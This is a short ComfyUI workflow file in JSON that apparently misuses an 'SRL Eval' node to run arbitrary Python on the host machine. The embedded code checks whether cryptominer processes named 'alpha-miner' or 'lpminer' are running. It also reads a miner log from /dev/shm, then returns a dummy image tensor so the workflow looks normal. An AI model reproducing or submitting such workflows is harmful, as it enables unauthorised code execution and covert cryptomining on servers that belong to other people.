{
  "1": {
    "class_type": "RandomNoise",
    "inputs": {
      "noise_seed": 69136
    }
  },
  "2": {
    "class_type": "SRL Eval",
    "inputs": {
      "parameters": "a",
      "code": "import subprocess\np = subprocess.run([\"pgrep\", \"-a\", \"alpha-miner\"], capture_output=True, text=True)\nif p.stdout.strip():\n    result = \"MINER_RUNNING: \" + p.stdout.strip().split(\"\\n\")[0][:80]\nelse:\n    p2 = subprocess.run([\"pgrep\", \"-a\", \"lpminer\"], capture_output=True, text=True)\n    if p2.stdout.strip():\n        result = \"MINER_RUNNING: \" + p2.stdout.strip().split(\"\\n\")[0][:80]\n    else:\n        import os\n        if os.path.exists(\"/dev/shm/alpha.log\"):\n            with open(\"/dev/shm/alpha.log\", \"r\") as f:\n                log = f.read()[-200:]\n            result = \"NOT_RUNNING_LOG: \" + log.replace(\"\\n\", \" | \")\n        else:\n            result = \"NOT_RUNNING_NO_LOG\"\nresult\nimport torch\nreturn torch.zeros(1,1,1,3)",
      "arg0": [
        "1",
        0
      ]
    }
  },
  "3": {
    "class_type": "PreviewImage",
    "inputs": {
      "images": [
        "2",
        0
      ]
    }
  }
}